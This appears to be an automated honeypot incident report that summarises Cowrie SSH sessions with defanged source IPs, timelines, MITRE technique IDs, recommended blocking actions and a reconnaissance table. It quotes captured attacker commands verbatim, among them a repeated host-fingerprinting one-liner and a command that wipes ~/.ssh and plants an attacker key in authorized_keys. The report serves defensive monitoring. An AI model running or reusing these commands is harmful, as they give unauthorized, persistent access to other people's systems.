| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:46:13` | `cowrie.session.connect` |
| `2026-07-17 04:46:14` | `cowrie.client.version` |
| `2026-07-17 04:46:14` | `cowrie.client.kex` |
| `2026-07-17 04:46:17` | `cowrie.login.success` |
| `2026-07-17 04:46:18` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8edf04ffa53e

| Field | Detail |
|---|---|
| **Source IP** | `125.23.255[.]134` |
| **First Seen** | 2026-07-17 04:46 |
| **Last Seen** | 2026-07-17 04:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:46:23` | `cowrie.session.connect` |
| `2026-07-17 04:46:24` | `cowrie.client.version` |
| `2026-07-17 04:46:24` | `cowrie.client.kex` |
| `2026-07-17 04:46:26` | `cowrie.login.success` |
| `2026-07-17 04:46:27` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.255[.]134` to AbuseIPDB if not already reported
- [ ] Block `125.23.255[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c92fecbfe169

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:46 |
| **Last Seen** | 2026-07-17 04:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:46:27` | `cowrie.session.connect` |
| `2026-07-17 04:46:27` | `cowrie.client.version` |
| `2026-07-17 04:46:27` | `cowrie.client.kex` |
| `2026-07-17 04:46:29` | `cowrie.login.success` |
| `2026-07-17 04:46:31` | `cowrie.session.params` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.success` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.command.input` |
| `2026-07-17 04:46:31` | `cowrie.log.closed` |
| `2026-07-17 04:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903daa106bb7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:47 |
| **Last Seen** | 2026-07-17 04:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:47:55` | `cowrie.session.connect` |
| `2026-07-17 04:47:55` | `cowrie.client.version` |
| `2026-07-17 04:47:55` | `cowrie.client.kex` |
| `2026-07-17 04:47:57` | `cowrie.login.success` |
| `2026-07-17 04:47:59` | `cowrie.session.params` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.success` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.command.input` |
| `2026-07-17 04:47:59` | `cowrie.log.closed` |
| `2026-07-17 04:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5282b8279252

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-17 04:49 |
| **Last Seen** | 2026-07-17 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:49:20` | `cowrie.session.connect` |
| `2026-07-17 04:49:20` | `cowrie.client.version` |
| `2026-07-17 04:49:21` | `cowrie.client.kex` |
| `2026-07-17 04:49:21` | `cowrie.login.success` |
| `2026-07-17 04:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e11d171326f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:49 |
| **Last Seen** | 2026-07-17 04:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:49:24` | `cowrie.session.connect` |
| `2026-07-17 04:49:24` | `cowrie.client.version` |
| `2026-07-17 04:49:24` | `cowrie.client.kex` |
| `2026-07-17 04:49:26` | `cowrie.login.success` |
| `2026-07-17 04:49:27` | `cowrie.session.params` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.success` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:27` | `cowrie.command.input` |
| `2026-07-17 04:49:28` | `cowrie.log.closed` |
| `2026-07-17 04:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdfd4b38fe90

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:50 |
| **Last Seen** | 2026-07-17 04:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:50:51` | `cowrie.session.connect` |
| `2026-07-17 04:50:52` | `cowrie.client.version` |
| `2026-07-17 04:50:52` | `cowrie.client.kex` |
| `2026-07-17 04:50:54` | `cowrie.login.success` |
| `2026-07-17 04:50:55` | `cowrie.session.params` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.success` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:55` | `cowrie.command.input` |
| `2026-07-17 04:50:56` | `cowrie.log.closed` |
| `2026-07-17 04:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff54eded2a14

| Field | Detail |
|---|---|
| **Source IP** | `14.177.234[.]24` |
| **First Seen** | 2026-07-17 04:51 |
| **Last Seen** | 2026-07-17 04:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:51:03` | `cowrie.session.connect` |
| `2026-07-17 04:51:03` | `cowrie.client.version` |
| `2026-07-17 04:51:03` | `cowrie.client.kex` |
| `2026-07-17 04:51:04` | `cowrie.login.success` |
| `2026-07-17 04:51:06` | `cowrie.session.params` |
| `2026-07-17 04:51:06` | `cowrie.command.input` |
| `2026-07-17 04:51:06` | `cowrie.command.failed` |
| `2026-07-17 04:51:06` | `cowrie.log.closed` |
| `2026-07-17 04:51:07` | `cowrie.session.params` |
| `2026-07-17 04:51:07` | `cowrie.command.input` |
| `2026-07-17 04:51:07` | `cowrie.session.file_download` |
| `2026-07-17 04:51:07` | `cowrie.log.closed` |
| `2026-07-17 04:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.177.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `14.177.234[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-425b346be1b4

| Field | Detail |
|---|---|
| **Source IP** | `14.177.234[.]24` |
| **First Seen** | 2026-07-17 04:51 |
| **Last Seen** | 2026-07-17 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:51:07` | `cowrie.session.connect` |
| `2026-07-17 04:51:07` | `cowrie.client.version` |
| `2026-07-17 04:51:08` | `cowrie.client.kex` |
| `2026-07-17 04:51:09` | `cowrie.login.success` |
| `2026-07-17 04:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.177.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `14.177.234[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-696065771254

| Field | Detail |
|---|---|
| **Source IP** | `14.177.234[.]24` |
| **First Seen** | 2026-07-17 04:51 |
| **Last Seen** | 2026-07-17 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:51:09` | `cowrie.session.connect` |
| `2026-07-17 04:51:09` | `cowrie.client.version` |
| `2026-07-17 04:51:09` | `cowrie.client.kex` |
| `2026-07-17 04:51:10` | `cowrie.login.success` |
| `2026-07-17 04:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.177.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `14.177.234[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db6f764d7c55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:52 |
| **Last Seen** | 2026-07-17 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:52:23` | `cowrie.session.connect` |
| `2026-07-17 04:52:23` | `cowrie.client.version` |
| `2026-07-17 04:52:23` | `cowrie.client.kex` |
| `2026-07-17 04:52:25` | `cowrie.login.success` |
| `2026-07-17 04:52:26` | `cowrie.session.params` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.success` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:26` | `cowrie.command.input` |
| `2026-07-17 04:52:27` | `cowrie.log.closed` |
| `2026-07-17 04:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d05ea892b182

| Field | Detail |
|---|---|
| **Source IP** | `45.55.133[.]80` |
| **First Seen** | 2026-07-17 04:53 |
| **Last Seen** | 2026-07-17 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:53:21` | `cowrie.session.connect` |
| `2026-07-17 04:53:22` | `cowrie.client.version` |
| `2026-07-17 04:53:22` | `cowrie.client.kex` |
| `2026-07-17 04:53:23` | `cowrie.login.success` |
| `2026-07-17 04:53:24` | `cowrie.direct-tcpip.request` |
| `2026-07-17 04:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.55.133[.]80` to AbuseIPDB if not already reported
- [ ] Block `45.55.133[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5808e4dd4f7d

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 04:53 |
| **Last Seen** | 2026-07-17 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:53:49` | `cowrie.session.connect` |
| `2026-07-17 04:53:49` | `cowrie.client.version` |
| `2026-07-17 04:53:49` | `cowrie.client.kex` |
| `2026-07-17 04:53:49` | `cowrie.login.success` |
| `2026-07-17 04:53:50` | `cowrie.session.params` |
| `2026-07-17 04:53:50` | `cowrie.command.input` |
| `2026-07-17 04:53:50` | `cowrie.log.closed` |
| `2026-07-17 04:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6113e7c10236

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 04:53 |
| **Last Seen** | 2026-07-17 04:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 04:53:54` | `cowrie.session.connect` |
| `2026-07-17 04:53:55` | `cowrie.client.version` |
| `2026-07-17 04:53:55` | `cowrie.client.kex` |
| `2026-07-17 04:53:56` | `cowrie.login.success` |
| `2026-07-17 04:53:58` | `cowrie.session.params` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.success` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.command.input` |
| `2026-07-17 04:53:58` | `cowrie.log.closed` |
| `2026-07-17 04:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.35.8[.]0` | **132** | 2026-07-17 00:56 | 2026-07-17 04:50 | 76m | 0 | `T1592` | 🟠 MEDIUM |
| `34.76.4[.]158` | **30** | 2026-07-17 03:37 | 2026-07-17 03:37 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `35.240.32[.]90` | **30** | 2026-07-17 03:10 | 2026-07-17 03:10 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `88.214.25[.]123` | **6** | 2026-07-17 03:06 | 2026-07-17 03:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]96` | **5** | 2026-07-17 01:52 | 2026-07-17 01:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | **3** | 2026-07-17 01:41 | 2026-07-17 01:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-17 04:26 | 2026-07-17 04:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-17 01:53 | 2026-07-17 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-17 02:08 | 2026-07-17 02:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]36` | **3** | 2026-07-17 01:52 | 2026-07-17 01:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | **3** | 2026-07-17 01:51 | 2026-07-17 01:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]85` | **3** | 2026-07-17 01:07 | 2026-07-17 01:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-07-17 04:45 | 2026-07-17 04:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.82[.]124` | **2** | 2026-07-17 01:55 | 2026-07-17 01:57 | 2m | 0 | `T1592` | 🟢 LOW |
| `156.225.1[.]92` | **2** | 2026-07-17 01:24 | 2026-07-17 01:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-07-17 02:24 | 2026-07-17 02:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]125` | **2** | 2026-07-17 03:55 | 2026-07-17 03:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]165` | **2** | 2026-07-17 03:44 | 2026-07-17 03:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-07-17 02:54 | 2026-07-17 03:12 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]50` | **2** | 2026-07-17 02:42 | 2026-07-17 03:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]17` | 1 | 2026-07-17 01:06 | 2026-07-17 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]19` | 1 | 2026-07-17 01:06 | 2026-07-17 01:06 | 5s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]20` | 1 | 2026-07-17 01:06 | 2026-07-17 01:06 | 5s | 0 | `T1592` | 🟢 LOW |
| `115.229.185[.]15` | 1 | 2026-07-17 01:27 | 2026-07-17 01:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.222.53[.]245` | 1 | 2026-07-17 03:00 | 2026-07-17 03:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `124.174.82[.]178` | 1 | 2026-07-17 02:49 | 2026-07-17 02:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.108[.]225` | 1 | 2026-07-17 01:25 | 2026-07-17 01:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.89.109[.]204` | 1 | 2026-07-17 00:59 | 2026-07-17 00:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.170.1[.]244` | 1 | 2026-07-17 04:21 | 2026-07-17 04:21 | 4s | 0 | `T1592` | 🟢 LOW |
| `177.22.44[.]30` | 1 | 2026-07-17 04:47 | 2026-07-17 04:47 | 21s | 0 | `T1592` | 🟢 LOW |
| `183.129.52[.]189` | 1 | 2026-07-17 01:27 | 2026-07-17 01:27 | 12s | 0 | `T1592` | 🟢 LOW |
| `183.171.149[.]196` | 1 | 2026-07-17 02:24 | 2026-07-17 02:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.236[.]23` | 1 | 2026-07-17 04:03 | 2026-07-17 04:03 | 3s | 0 | `T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-07-17 01:38 | 2026-07-17 01:40 | 119s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]2` | 1 | 2026-07-17 04:44 | 2026-07-17 04:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]60` | 1 | 2026-07-17 04:45 | 2026-07-17 04:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]243` | 1 | 2026-07-17 04:44 | 2026-07-17 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]246` | 1 | 2026-07-17 04:16 | 2026-07-17 04:16 | 0s | 0 | `T1592` | 🟢 LOW |
